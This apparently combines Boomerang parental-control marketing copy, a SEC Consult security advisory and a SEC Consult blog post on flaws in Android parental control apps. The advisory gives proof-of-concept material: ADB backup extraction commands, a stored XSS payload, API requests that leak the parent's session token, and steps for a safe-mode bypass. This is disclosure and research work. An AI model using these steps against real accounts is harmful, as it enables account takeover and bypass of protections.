## Boomerang Parental Control

#### **Taking the battle out of screen time**

[![Boomerang Parental Control Sideload badge](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/23110510/Sideload-badge1.png)](https://useboomerang.com/download/)

## The most unique flexible screen time features. Period.

**Set it and forget it** – weekday and weekend schedules limiting your child’s smartphone access from your parent mobile device.

### Bedtimes. Reinforced.

Establish healthy sleep habits for your children. Schedule shutdown times to give you peace of mind that your child is getting uninterrupted sleep.

![iPhone8-Screen Time Schedules Parent Mode](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/27154711/iPhone8-Screen-Time-Schedules-Parent-Mode.png)

### Time Limits. Daily. Per App.

Allocate time limits on your Android device so as to teach children how to prioritize ‘free time” on their phones. Apps will shut down under your authority. Phone remains accessible for emergencies.

![Pixel2-Allocated Time up Child Mode](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/04174009/Pixel2-Allocated-Time-up-Child-Mode.png)

### Encourage Good Apps. Anytime.

*Encouraged Apps* are exempted from time limits. Great for education, reading, podcast or health and safety apps. Parents choose which apps are added to their child’s list.

![Android Encourage Apps Child Mode](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/28153520/Pixel2-Encourage-Apps-Child-Mode-e1522289426584.png)

### Time-Outs and Time Extensions.

Our Parent Mode provides an easy Time-Out setting. When needed, parents can pause a child’s Android device use or even extend access time.

## 13 year olds. With smartphones.

Smartphones have opened up a new world in how our kids communicate – expressing themselves via text, images and video opens challenges for inappropriate content and cyberbullying.

*❗️Our Call and Text monitoring safety features are only available for Android smartphones. **[Downloaded here](https://useboomerang.com/download/?utm_source=useboomerang&utm_medium=textfeature).***

### Text Messages. Monitoring the important words

**Android only.** Get detailed text logs from your child’s Android phone. Get notified when inappropriate words (keyword detection can be customized) or unknown numbers are detected. Optionally, enable the collection of all text message content. **[Available here](https://useboomerang.com/download/?utm_source=useboomerang&utm_medium=textfeature).**

![iPhone8-parent mode badwords text](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/12135718/iPhone8-parent-mode-badwords-text.png)

### You choose who calls and can be called.

**Android only.** Allow calls only from their saved contacts. All other numbers get blocked instantly and sent to voicemail, including those marketing calls. Parents can also review their child’s Android phone logs anytime from their Android or iOS device via our Parent Mode reports.

![Android Blocked call](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/05123921/Pixel2-Blocked-call.png)

### 24/7 location tracking.

Your child’s device travels with them. You depend on it for communication. So why not leverage it to get alerts and updates on your child’s whereabouts via their mobile device. Set to report in automatically but you can make it faster or ask for a manual refresh. An active internet connection is required.

![Parent Mode child location](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/05071054/Pixel2-Parent-Mode-child-location.png)

### Pair family devices with your email.

Creating a group to pair all family devices is simple. Just use one of your parent emails and that is now your group name. No need to create a new email account for your child in order to monitor their activities. Follow our setup steps and pair all devices with your email and password.

## App Discovery, Approval & Control.

Get notified when new apps are installed on your child’s Android device and approve or block them from your parent mobile device. Great opportunity to start conversations about your child’s app interests and how they heard about them.

### New App Approvals. Be informed.

**Android only.** Boomerang Parental Control blocks new app installs on your child’s device. You get notified of the new app installs and can keep them blocked or approve them from your iPhone or Android parent device.

![iPhone - App Approval Parent Mode](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/27162121/iPhone8-App-Approval-Parent-Mode.png)

### Block or Allow any app. On demand too.

**Android only.**With our *Parent Mode* app for Android and iOS, parents can block any apps, set daily time limits or allow educational / health apps to work outside of device screen time limits on their child’s Android device.

![Android - Instagram Blocked Chid Mode](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/27162217/Pixel2-Instagram-Blocked-Chid-Mode.png)

## Exclusive monitoring and security.

Boomerang brings unique features that no other parental control apps offer today. Samsung devices that support Knox receive additional controls.

![Samsung S8 - Knox + Apple Parent Mode YouTube History 2x](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/03172806/YT-and-Knox-2x.png)

### YouTube History & Searches. Included.

**Android only.**Review your child’s viewing history and searches made in the Android YouTube app (YouTube Kids not required). Tip: [Enable restricted mode and block access to the YouTube app’s Settings](http://useboomerang.com/2018/09/11/best-way-filter-monitor-youtube-now/). Reports can be viewed on an Android or iOS parent device.

### Samsung Knox. Built-in.

Boomerang is the only parental control app to utilize Samsung’s Knox, an enterprise mobile security solution pre-installed in most of Samsung devices. It provides security magic!

## Safe Browsing is Included for Free.

Manage and review your child’s browsing experience with our SPIN Safe Browser. Built-in filtering of millions of inappropriate websites with content ranging from pornography and nudity to the grey areas like many social media platforms, blogging sites and unfiltered search engines.

*Android users, we filter the Chrome browser too!*

### Safe Searching.

Search results in leading search engines like Bing, Google and Yahoo are automatically enforced in the strictest setting available. This means your child will see more more appropriate search result and images vs. using Safari or Chrome.

![Android SPIN Google safe search](https://d1ccyq5daphyhz.cloudfront.net/wp-content/uploads/2018/03/23133211/Pixel2-SPIN-Google-safe-search.png)

### Surf the web. Safely.

With our free SPIN Safe Browser, kids (and adults) can browse the web with a built-in filter for inappropriate websites. Categories such as Pornographic, Nudity, Hate, Violence and other inappropriately flagged websites are blocked, automatically, anywhere on mobile or wifi.

Vendor description:
-------------------
"National Education Technologies Inc. is a manufacturer of mobile
applications. Their portfolio ranges from parental control apps, to
safe browsing apps, to digital wellbeing apps."

Source: <https://nationaledtech.com>

Business recommendation:
------------------------
The vendor only provides an update for one of the identified security issues,
but it effectively reduces the risk of some of the other vulnerabilities, which
are currently not fixed yet. The vendor could not provide a timeline when the
rest of the issues will be patched.
If possible, limit the possibility to boot into Android safe mode. Otherwise
children are always able to bypass any restrictions.

An in-depth security analysis performed by security professionals is
highly advised, to identify and resolve potential further critical security
issues.

Vulnerability overview/description:
-----------------------------------
1) ADB Backup allowed (CVE-2023-36620)
The app is missing the android:allowBackup="false" attribute in the
manifest which allows the user to backup the internal memory of the
app to a PC. This gives the user access to the device (in case ADB is enabled)
and API token which are used to authenticate requests to the API.

2) Stored XSS
The customizable name of the child's device can be used to trigger a XSS
payload in the parent web dashboard. Children might be able to attack
their parents' account.

3) Trigger parent control functions from child device (Privilege Escalation)
A device token in the form of a UUID is used as a session token for the parent
and the child device. The parent device token is leaked on an endpoint which
is accessible by the child, which is equivalent to leaking the session token.
This token can then be used to authenticate requests to the API and get the same
access rights as the parent. This would allow a child to bypass restrictions
and access device settings.

4) Disable Child App Restriction without Parent's notice (CVE-2023-36621)
The child can remove all restrictions temporarily or uninstall the application
without the parents noticing.

Proof of concept:
-----------------
1) ADB Backup allowed (CVE-2023-36620)
The internals of the app can be backed up to a PC by connecting the device
and running the following commands. As a prerequisite, the ADB feature
must be enabled or being used via recovery. Children could bypass any Android
setting restrictions via vulnerability 3).

--------------------------------------------------------------------------------
adb backup -apk com.nationaledtech.Boomerang
dd if=backup.ab bs=24 skip=1 | zlib-flate -uncompress | tar xf -
--------------------------------------------------------------------------------

The internal data contains the device and API token which are used to
communicate with the API.

2) Stored XSS
As the internal memory including the device and API token is backup-able (see 1),
it is possible to construct arbitrary requests to the API in the name
of the child. The following payload can be used to change the device name
and trigger an alert box in the dashboard of the parent:

--------------------------------------------------------------------------------
POST /services/DeviceService.svc/RenameDevice HTTP/1.1
Accept: application/json
Content-Type: application/json;charset=UTF-8
Content-Length: 1470
Host: app.useboomerang.com

{
     "DeviceToken": <child-device-token>,
     "ApiToken": <child-api-token>,
     "DeviceTitle":"\"\/><img src=\"x\" onerror=\"alert(1)\"\/>",
     "TargetDeviceToken": <child-device-token>
}
--------------------------------------------------------------------------------

3) Access parent control functions from child device (Privilege Escalation)
When visiting the Family Messenger Tab within the application on the device, a GET
request to API endpoint `/services/FamilyService.svc/GetAllFamilyDevices` will be
sent and the response contains all DeviceTokens associated with the account
(including the ones of parent devices).

To be able to query the `/services/FamilyService.svc/GetAllFamilyDevices`
endpoint an attacker first needs to backup their device and get access to their
own device and API token. Then an attacker is able to create their own request
querying the device token of the parent.

--------------------------------------------------------------------------------
POST /services/FamilyService.svc/GetAllFamilyDevices HTTP/1.1
Accept: application/json
Content-Type: application/json;charset=UTF-8
Content-Length: 54
User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; Pixel 4a Build/RQ2A.210305.006)
Host: app.useboomerang.com
Connection: close
Accept-Encoding: gzip, deflate

{"DeviceToken":"<child-token>"}
--------------------------------------------------------------------------------

Response:
--------------------------------------------------------------------------------
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Connection: close
Content-Length: 450

{
        "content":null,
        "isSuccessful":true,
        "Devices":[
                {
                        "DeviceToken":"[parent-token]",
                        [...]
                }
        ]
}
--------------------------------------------------------------------------------

With the DeviceToken of the parent, the API token can be retrieved from the
`/services/DeviceService.svc/UpdateStatus` endpoint:

--------------------------------------------------------------------------------
POST /services/DeviceService.svc/UpdateStatus HTTP/1.1
Host: app.useboomerang.com
Accept: application/json
Content-Type: application/json
User-Agent: Boomerang/234 CFNetwork/1240.0.4 Darwin/20.5.0
Accept-Language: en-us
Content-Length: 55
Accept-Encoding: gzip, deflate
Connection: close

{"DeviceToken": <parent-token>,}
--------------------------------------------------------------------------------

As the device token combined with the API token are used to authenticate requests
to the API, the child now has the same access rights as the parent.

4) Disable Child App Restriction without Parent's notice (CVE-2023-36621)
The child can disable the restrictions of the application without the parents
noticing. For this, the following steps are necessary:
a) Turn off Internet connectivity on the child device or block access to the
    API server (e.g. on the router).
b) Reboot into Android Safe Mode.
c) Disable Device Admin, "Display over other apps", Usage Access, Accessibility
    Permissions for the app in Android settings.
d) After rebooting in to normal mode, the child device can be used without
    restrictions. For example, previously locked apps can now be used. The parent's
    application will show that Protection is still on and the last check-in time.
    Internet must stay off on the child device during this.
e) After usage of the restricted apps is finished, the mentioned permissions are
    turned back on.
f) The device is restarted to clear any cached HTTP requests of the app that might
    inform the parent.
g) Internet is re-enabled. The parent's device will not see an indication of these
    activities on their device.

Alternatively, the Boomerang app can also be uninstalled after disabling the Device
Admin permission in step 3. Internet can then be turned on as well on the child's
device without any notification to the parent. The only way for the parent to notice
this would be to manually check the last check-in time.

The "Safe Mode Bypass" cannot be exploited on Samsung KNOX capable devices, as
special restrictions can be set in order to disable booting into safe mode.

Vulnerable / tested versions:
-----------------------------
The following version has been tested and downloaded from the Google Play store,
which was the most recent version available at the time of the initial test:
* Android app version 13.53

Later on, version 13.61 (2022-10-25) and 13.68 (2022-12-13) have been verified to be
vulnerable as well.

Why parental control apps aren’t the answer to protecting your kids online

![](/fileadmin/_processed_/2/d/csm_sec-consult-h-parental-apps-AdobeStock_483680876_2e6ab0aa98.jpg)

Fabian Densborn and Bernhard Gründling of the SEC Consult Vulnerability Lab recently discovered several security vulnerabilities in popular parental control apps for the Android platform. During their analysis, they found out that the parent web dashboards were susceptible to cross-site request forgery (CSRF) and cross-site scripting (XSS) attacks.

These vulnerabilities allowed the attacker to bypass the restrictions set by the parents, or even attack the parents themselves. Additionally, the Android apps’ restrictions imposed by the parents could be easily bypassed by the children by removing the necessary permissions in the settings app or by using the safe mode feature of Android. Since many of these apps collect a lot of private data of children, and some may even store the data in the cloud beyond the reach of GDPR, the privacy of the surveilled children may be at risk.

**The SEC Consult Vulnerability Lab is already in contact with some of the vendors mentioned below through our responsible disclosure process. The identified security vulnerabilities should be fixed in the near future, according to the vendors. We are going to release further technical details through security advisories after those patches are publicly available.**

## Introduction

Nowadays, children have access to smartphones or tablets at an early age or already possess their own devices. To block and control access to potentially harmful or non-child-friendly content or restrict usage times, parents often install parental control apps on the children's devices. The goal of this infosec research was to find out whether the apps' users are properly separated from each other in order to prevent unauthorized third parties accessing their data or devices. Moreover, we wanted to find out which and how much data is being collected and stored by these apps in general.

We examined the information stored on the device and at the app provider (e.g. cloud storage) and paid close attention to the features that enable parental management of the child device. We investigated if it was possible to circumvent authorization checks so that remote or local attackers could access features of the child devices or gain access to personal information of other users of those applications.

This blog post describes which apps were looked at, the methodology used to analyze the apps and the identified vulnerability classes. As mentioned above, we currently won’t provide detailed technical information, because some applications are still vulnerable to those attacks and some issues might not be easily resolved.

We wanted to perform this research to assess the security of those tools, because we are using some of them privately as well.Johannes Greil, Head of SEC Consult Vulnerability Lab
## Overview of analyzed apps

The following table lists the apps which have been briefly analyzed, based on the methodology mentioned below. The scope of this research is restricted to parental control apps for the Android mobile platform and no full security review has been performed for any of these apps.

## Methodology

This section covers the analysis of the Android apps and which tools we used for this purpose.

### Static Analysis

We started our analysis with the [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) framework to get an overview of the different apps in scope, the related permissions and potentially low-hanging fruits regarding security issues.

Some apps allow to be backed up using the Android Debug Bridge ([ADB](https://developer.android.com/studio/command-line/adb)) as the corresponding flag to prevent this (*android:allowBackup="false"*) was not set in the manifest by the developers. ADB is a command-line tool that allows developers to communicate with an Android device. Besides creating backups of Android apps, it can be used to issue a variety of commands to an Android device, such as installing and debugging apps, changing various device settings, and more. **If attackers were to gain access to such a backup, they would be able to extract potentially sensitive configuration files or locally stored private data of the children.**

We also noticed that many of these apps have a flag set for allowing plain text connections (*android:usesCleartextTraffic="true"*). This flag enables the application to use unencrypted communication, which an attacker on the same network can easily gain access to. For example, a simple man-in-the-middle attack could be used to sniff user credentials or other PII data. **But since all of the tested apps have employed transport layer encryption (TLS), it is unclear why this flag was set, as this gives developers the option to send unencrypted requests.**

Next, we checked if there are any hard-coded credentials to be found in the source code which might allow an attacker to perform further attacks. **All identified API keys were checked against the possibility of misuse due to a lack of API key restrictions.**

### Dynamic Analysis

For the dynamic analysis, we installed the apps on physical, rooted test devices: Google Pixel 4a with Android 11

After registering and playing around with the respective apps, we manually checked the internal memory using ADB. After determining which data is stored on the device, we tried intercepting the traffic **to see where data is being sent and which data is being collected in the first place.**

Some of the analyzed apps had security measures like [certificate pinning](https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning) in place (a measure against man-in-the-middle sniffing attacks), but all of them could easily be circumvented by using the [Universal SSL Pinning Bypass](https://codeshare.frida.re/%40pcipolloni/universal-android-ssl-pinning-bypass-with-frida/) script for [Frida](https://frida.re/). This enabled us to further analyze the API calls of the applications to their cloud servers using proxy tools such as Burp Suite and to check whether attackers could access data of other users/children (in this case our own test devices), e.g. through [insecure direct object references](https://owasp.org/Top10/A01_2021-Broken_Access_Control/).

![](/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2022_12/sec-consult-c-AdobeStock_314648859.jpg)
### Web Dashboard

Most apps even had a web dashboard for parents that could be used to place restrictions on the child's device or even perform actions on it. In most cases, the functionality of the web dashboard was the same as the parental app. But some apps offered additional functions in the web dashboard, such as geofencing features or even more available restrictions and notification settings.

Again, the network requests were intercepted and analyzed through proxy tools. We looked at which data is being stored and paid special attention to the functions that enable controlling the child's device. It was interesting to see whether it was possible to bypass authorizations, **if devices could be controlled by other users or if children were able to attack their parents via those dashboards.**

## Vulnerability Classes Overview

Controlling Other Devices

During testing, we looked at many different test classes of the OWASP Mobile Application Security Testing Guide ([MASTG](https://mobile-security.gitbook.io/mobile-security-testing-guide/)) and Web Security Testing Guide ([WSTG](https://owasp.org/www-project-web-security-testing-guide/stable/)) frameworks although the focus of this research was particularly on **authorization vulnerabilities**. The aim was to check if users have access to other users' data and if they can control or read out other children's (or parents’) smartphones or tablets this way. **None of the tested apps allowed to control other devices.**

However, in one of the tested apps, some data like a list of installed apps or other usage metadata (e.g. total SMS, app usage time, contacts count, etc.) could be read out from another device via the API.

Web-based Attacks

Apps providing a web dashboard for the parents are often vulnerable to typical web-based attacks such as cross-site request forgery (CSRF), clickjacking and cross-site scripting (XSS).

**Two of the tested apps** allowed an attack against their own parent device using a cross-site scripting (XSS) JavaScript payload. If a parent used the web dashboard of the app, the children’s device could perform arbitrary actions on behalf of the parents and potentially bypass current restrictions or gain access to the parents' user credentials.

Privilege Escalation

Another one of the tested parental control apps allowed the child's app to extend its own rights via the API due to a lack of proper [session management](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/). Possible actions on behalf of the parents included deactivation of all restrictions!

App Restriction Bypass

On **all** tested apps, the set restrictions could be bypassed by revoking the app's permissions via the Android settings. As a result, children were able to use their smartphone without any restrictions imposed.

All the tested applications rely on a few special Android permissions like „Device administration", „Usage access", „Accessibility" and "Draw over other apps" permissions. Due to the nature of the [Android platform security model and its multi-party consent mechanism](https://dl.acm.org/doi/10.1145/3448609), the device owner will always have the option to remove permissions from an app.

Some reviewed applications try to prevent this by e.g. drawing overlays on top of system settings.

"Safe mode" bypass

However, when booting into Android Safe Mode (long-press the "Power off" or "Reboot" button on the phone), all third-party applications are disabled and therefore the app can be uninstalled, or its permissions can be revoked. Hence it was possible to remove the mentioned permissions of the child app and bypass imposed restrictions. By disabling Internet access during this procedure (during safe mode), parents would also not get notified of these changes.

One effective way to prevent the bypass would be to provide a fully managed device controlled by a Device Policy Controller which acts as the device owner. None of the assessed apps make use of this special Android feature. It would take some extra steps to set up, requiring a computer and ADB access to the child's device, making this an unfeasible solution for most parents.

## Vulnerability count

| Boomerang | Familytime | Find my Kids | Kidssecurity Parental Control | Kids Place Parental Control | Parental Control Kroha | Qustodio | Wondershare |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 4 | 2 | 1 | 2 | 5 | 2 | 1 | 1 |

The table above shows the amount of identified vulnerabilities for each app. As mentioned, we won't publish any further details as long as the vulnerabilities have not been fixed by the vendors. **Please keep in mind, that the security checks were timely limited for each app and no detailed security review was performed. An app having only one (currently known) security issue does not render that app more secure than an app with two issues.**

### Samsung KNOX remarks

During our research, we briefly had the opportunity to check out a Samsung Galaxy S9 device of a child and a Samsung Galaxy S22 Ultra as the parent device. Thanks to [Samsung KNOX](https://samsungknox.com/en), one of the tested parental control apps (Boomerang), that was installed on this device, allowed an even more fine-grained approach to set security restrictions. It could be verified that if Samsung KNOX is available on the phone, a parent could disable shutting down the phone or booting into safe mode. Further research was not performed regarding other available Samsung KNOX features, nor was Samsung KNOX in scope of this review but it could be verified that the “Safe mode” bypass mentioned above could not be exploited on this device.

## Privacy Concerns

Parental control apps store and transmit a lot of private and highly sensitive information, including the list of installed apps, the usage behavior of children on their devices, stored contacts, photos, GPS location, phone call metadata, and incoming notifications or even full contents of text messages. This could also break the assumed confidentiality of messages sent via end-to-end encrypted messaging apps.

Here is a list of identified vendor website locations (used by the vendors for their online presence, documentation or download of the apps) which were verified based on the IP addresses and domains. **Please keep in mind that this information might change in the future and could be dependent on your geolocation as well.**

#### Vendor location information

When using parental control apps, parents should be aware that this information ends up on the servers of the app vendors and a lot of trust is put in the provider of the software. Unfortunately, all of the examined app servers have access to the stored data since it is not end-to-end encrypted before it leaves the child’s device (transmission over the network is secured via TLS though). In the event of a data leak, all that sensitive information would be accessible to attackers in plain text.

We also found several third-party servers which were contacted while using the respective applications. These are mainly used to track the user's usage behavior inside the application or web dashboard. Some of them perform very detailed tracking of mouse movement and clicks. For example, the web dashboard of Find My Kids sends varying amounts of data – depending on the mouse movement – to a Russian tracking domain (mc.yandex.ru). A compilation of such servers can be seen in the table further below.

Since you have to trust the software provider and have little control over the child's data, picking the right parental control app is not an easy task.

**The following table lists all identified 3rd party domains or servers that are being contacted upon using the web dashboards or websites of the vendor. This list is not necessarily complete and also may change in the future. It is noticeable that nearly all use some sort of tracking services.**

## Tips for parents on how to choose parental control apps

Parental control applications all seem to have various flaws, so it sadly comes down to your own risk assessment. When choosing third-party apps, we recommend reviewing the vendors' reputation carefully. This includes online reviews, imprint, terms and conditions and privacy policy information of the vendor.

![](/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2022_12/sec-consult-c-cloud-AdobeStock_206296718.jpg)

Here are a few more questions to get you started:

* Are you willing to trust the provider?
* Are you aware of and okay with where they are storing the PII data?
* Is the vendor support communicative and do they provide relevant information to end users?
* Can this information be verified?
* Is the vendor located in a country which adheres to GDPR data protection governance?

For example, a [recently published blog post](https://sec-consult.com/blog/detail/the-eufycam-long-term-observation/) by the SEC Consult Vulnerability Lab showed that eufyCam / Anker was marketing “local storage only” as a feature for their surveillance cameras, but transmitted sensitive data to the cloud nevertheless.

**The following servers are being used by the vendors for the backend communication (API). All of the kids' usage data is being stored unencrypted there, as mentioned in the "privacy concers" chapter above.**

#### Where does your kids' data go

##### API servers of tested parental control apps

| App | Domain | IP Address | Country | Hosting provider |
| --- | --- | --- | --- | --- |
| Familytime | mesh2.familytime.io | 54.214.103.107 | United States | AWS |
| Boomerang | app.useboomerang.com | 23.96.102.165 | United States | MS |
| Quostodio | api.qustodio.com | 34.193.42.147 | US | AWS |
| Wondershare | us-west-data-api.famisafe.com | 47.88.22.34 | US | Alicloud |
| Find my Kids | api.findmykids.org | 159.69.174.250 | Germany | Hetzner |
| Parental Control Kroha | api.parentalcontrolkroha.net | 116.203.4.110 | Germany | Hetzner |
| Kids Place Parental Control | kidsplace.kiddoware.com | 54.148.41.244 | United States | AWS |
| Kidssecurity Parental Control | api.kidsecurity.tech | 167.99.251.182 | Germany | DigitalOcean |

Also try to verify how the vendor reacts upon security vulnerabilities. In our case, some of the vendors started working on a fix as soon as they were contacted by us, some did not even answer properly until today. We always add information about the communication in the timeline of our security advisories. This might help you to determine if they seem to have mature vulnerability handling processes (such as described in ISO/IEC 30111:2019) or (ideally) an information security management system (ISMS) in place.

We also recommend looking at parental control features native to the operating system (OS), like Google's Family Link for Android or Apple's Family Sharing for iOS. These are tightly integrated into the operating system and do not allow simple bypasses via safe mode like described above. From our short look at Google's Family link, it seems that a lot of thorough thought went into designing these features, especially regarding children's consent and the right to privacy.

**However, we did not perform a detailed analysis of these native OS features during this research, but it is on our to-do list for the future.**

Most importantly, parents should always inform their children about the use of any software on their devices and explain why those tools are implemented and which surveillance features are being used by the parents.

## Conclusion

Child safety apps may not be that safe after all. Children may consent to their parents having a look at their activities on their smartphones, but their privacy remains at risk as long as it is uncertain how software vendors store the data or who else might gain access at a later date. Security vulnerabilities raise even more privacy concerns. Eventually, creative children might even be able to bypass the restrictions and escape the surveillance nanny by themselves.

It's crucial not only for parents to feel safe about their children's smartphone usage, but also for children to feel comfortable with their parents' safety measures.Bernhard Gründling, researcher

Christmas is right around the corner and many children are likely to receive mobile phones or tablets as a gift. Therefore, it is important for parents to carefully consider their choice of the parental control app from a security, privacy or legal point of view and have a conversation with their child about its use.

### Timeline

This research project has been conducted by Fabian Densborn and Bernhard Gründling from August to November 2022. The vendors of certain apps have been contacted through our responsible disclosure process and informed about the identified vulnerabilities. Some have already started to work on a patch. After the responsible disclosure phase is completed and the vulnerabilities have been fixed, SEC Consult will publish the respective security advisories with more technical details.
